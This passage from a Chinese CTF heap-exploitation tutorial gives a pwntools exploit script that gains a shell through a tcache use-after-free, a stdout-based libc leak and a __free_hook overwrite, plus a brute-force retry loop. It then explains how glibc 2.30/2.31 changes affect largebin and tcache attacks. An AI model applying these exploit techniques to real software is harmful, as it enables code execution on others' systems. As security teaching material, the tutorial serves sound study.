
```python
#注释头
def pwn():
    global p
    heap_base = leak_heap()
    libc_base = leak_libc() - libc.sym['printf']
    elf_base = leak_elf() - elf.sym['main']
    log.info("heap_base:0x%x"%heap_base)
    log.info("libc_base:0x%x"%libc_base)
    log.info("elf_base:0x%x"%elf_base)
    add_malloc(0x1000-0x8-0x250,'PIG007NB')

    guess_libc = 0xd000
    guess_IO = guess_libc + libc.sym['_IO_2_1_stdout_']
    lg("guess_IO",guess_IO)

    tcacheMalloc(0x98) #idx 0x1~0x7
    add_malloc(0x98,"\x00"*0x98) #idx    0x8
    add_malloc(0x98,"\x00"*0x98) #idx    0x9
    add_malloc(0x38,"\x01"*0x38) #idx    0xa
    add_malloc(0x38,"\x02"*0x38) #idx    0xb
    add_malloc(0x38,"\x03"*0x38) #idx    0xc
    add_malloc(0x38,'\x04'*0x38) #idx    0xd

    #write libc addr
    tcacheDelete(0x1)
    free(0x9)
    add_malloc(0x38,p16((guess_IO)&0xffff)) #idx     0xe
    #show(0x1)
    #libc_base_attempt = u64Leakbase(libc.sym['_IO_2_1_stdout_'])
    #lg("libc_base_attempt",libc_base_attempt)

    #change 0x40 link_list
    free(0xa)
    free(0xc)
    edit(0xc,0x1,'\x10')

    add_malloc(0x38,'\x05'*0x38) #idx    0xf
    add_malloc(0x38,'\x06'*0x38) #idx    0x10
    add_malloc(0x38,p64(0xfbad1800)+p64(0)*3+'\x00') #idx    0x11

    libc_base = u64Leakbase(0x3b5890)
    lg("libc_base",libc_base)

    add_malloc(0x48,'/bin/sh\x00') #idx    0x12
    add_malloc(0x48,'/bin/sh\x00') #idx    0x13
    free(0x12)
    free(0x13)
    edit(0x13,0x8,p64(libc_base+libc.sym['__free_hook']))

    add_malloc(0x48,'/bin/sh\x00') #idx    0x14
    add_malloc(0x48,p64(libc_base+libc.sym['system'])) #idx     0x15
    free(0x14)
    it()

    i = 0
    while True:
        i = i + 1
        try:
            p = process("./note")
            lg("Times:",i)
            pwn()
        except EOFError:
            p.close()
            continue
        except Exception:
            p.close()
            continue
        else:
            p.interactive()
            break
```

▲爆破题外话：之前没怎么发现，这里发现PIE+ASLR出来的Libc地址开头可能是`0x7e`，而且中间也有可能会出现`\x00`的情况，这样就很容易使得我们爆破的次数直线上涨，所以在调试好了之后，爆破会加入

```python
#注释头
context.timeout = 0.5
#----------------------------------------------------------------------
except Exception:
    p.close()
    continue
```

来简单对抗这两种变化，防止爆破中断。

### (4)UAF+无Leak+Size做限制:

一般很多tcache的题都会对`size`做限制，要么小，要么大。但是其实对于tcache的UAF来说，没啥大用，都能绕过，不像fastbin一样，需要在目的地址伪造`size`。所以这里基本上修改一下`size`都可以得到对应解法，这种题目更多应该是考察堆布局的能力。需要有一个对于所有chunk进行布局的能力，最好准备草稿纸写写画画(excel也行).....

# 六、Glibc2.31

## 1.部分手段失效

### (1)原始largebin attack失效

从2.30开始将从unsortebin放入largebin的代码中在`size`比较的其中一个分支新增检查：

```c
//注释头
//unsortedbin chunk->size < largebin chunk->size
if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk))
{
    fwd = bck;
    bck = bck->bk;
    victim->fd_nextsize = fwd->fd;
    victim->bk_nextsize = fwd->fd->bk_nextsize;
    fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
}
else //unsortedbin chunk->size >= largebin chunk->size
{
    assert (chunk_main_arena (fwd));
    while ((unsigned long) size < chunksize_nomask (fwd))
    {
        fwd = fwd->fd_nextsize;
        assert (chunk_main_arena (fwd));
    }

    if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd))
    /* Always insert in the second position. */
        fwd = fwd->fd;
    else
    {
        victim->fd_nextsize = fwd;
        victim->bk_nextsize = fwd->bk_nextsize;
        if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))
            malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");
        fwd->bk_nextsize = victim;
        victim->bk_nextsize->fd_nextsize = victim;
    }
    bck = fwd->bk;
    if (bck->fd != fwd)
        malloc_printerr ("malloc(): largebin double linked list corrupted (bk)");
}
```

即当发生从unsortedbin中转移到largbin中时，如果unsortedbin中要转移的chunk的`size`大于largebin中原本就有的尾部chunk的`size`，就会触发新增的检查。否则，则不会触发新增的检查。

而新增检查的意思其实就是检查双向链表的完整性，这和之前unsortedbin失效加入的检查如出一辙。

```c
//注释头
if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))
    malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");
```

```c
//注释头
if (bck->fd != fwd)
    malloc_printerr ("malloc(): largebin double linked list corrupted (bk)");
```

但是由于当`size`小于的时候没有检查，所以largebin attack还是可以用的，只要unsortedbin中要放入largebin中的chunk的`size`小于largebin中chunk的`size`即可，但是这里的largebin attack已经被降级，相比之前的两个地址任意写，限制只能写一个地址了。

### (2)Tcache结构扩大

之前版本的tcache中count一直是一个字节，这回从2.30开始就变成了两个字节：

```c
//注释头
//2.29
typedef struct tcache_perthread_struct
{
    char counts[TCACHE_MAX_BINS];
    tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;

//2.30
typedef struct tcache_perthread_struct
{
    uint16_t counts[TCACHE_MAX_BINS];
    tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```

所以tcache的结构体也从0x250扩大为0x290

### (3)删除了一些assert

在2.30版本及之后，删除了一些有关tcache的assert

```c
//注释头
//2.29
tcache_put (mchunkptr chunk, size_t tc_idx)
{
    tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
    assert (tc_idx < TCACHE_MAX_BINS);

    /* Mark this chunk as "in the tcache" so the test in _int_free will
       detect a double free. */
    e->key = tcache;

    e->next = tcache->entries[tc_idx];
    tcache->entries[tc_idx] = e;
    ++(tcache->counts[tc_idx]);
}

//2.30
tcache_put (mchunkptr chunk, size_t tc_idx)
{
    tcache_entry *e = (tcache_entry *) chunk2mem (chunk);

    /* Mark this chunk as "in the tcache" so the test in _int_free will
       detect a double free. */
    e->key = tcache;

    e->next = tcache->entries[tc_idx];
    tcache->entries[tc_idx] = e;
    ++(tcache->counts[tc_idx]);
}

//2.29
tcache_get (size_t tc_idx)
{
    tcache_entry *e = tcache->entries[tc_idx];
    assert (tc_idx < TCACHE_MAX_BINS);
    assert (tcache->entries[tc_idx] > 0);
    tcache->entries[tc_idx] = e->next;
    --(tcache->counts[tc_idx]);
    e->key = NULL;
    return (void *) e;
}

//2.30
tcache_get (size_t tc_idx)
{
    tcache_entry *e = tcache->entries[tc_idx];
    tcache->entries[tc_idx] = e->next;
    --(tcache->counts[tc_idx]);
    e->key = NULL;
    return (void *) e;
}
```

以前就想着是不是能像控`fastbinY`溢出一样来控tcache溢出呢，但在2.29及以前肯定是不行的，因为有`assert`存在。就算修改了`mp_.tcache_bins`，成功进入`tcache_put`也会因为`assert(tc_idx<TCACHE_MAX_BINS)`的断言使得程序退出。
